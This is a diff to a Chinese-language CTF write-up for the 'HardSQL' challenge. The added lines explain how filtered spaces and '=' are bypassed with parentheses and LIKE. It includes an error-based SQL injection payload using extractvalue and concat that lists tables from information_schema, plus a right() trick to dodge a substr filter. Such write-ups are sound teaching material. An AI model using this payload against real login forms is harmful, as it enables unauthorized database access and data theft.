@@ -347,9 +347,11 @@ echo serialize($flag);
 （好像除了index.php之外都并不是直接给的，但是我们也只需要利用php伪协议去读取就好了）
 
 # 极客大挑战 2019【HardSQL】
-
+一个报错注入，空格被过滤了，所以只能用括号来构造payload
+`=`被过滤了，所以可以用like绕过
 ```http
 ?username=1&password=2'or(extractvalue(1,concat('~',(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())))))%23
 ```
-substr被过滤了，我们这里用一个小技巧
+substr被过滤了，但是报错又只能显示一点数量的内容，我们这里用一个小技巧
 right函数：从右边显示内容，这样可以得到另外的flag
+![](assets/Day%204/file-20251222024034259.png)
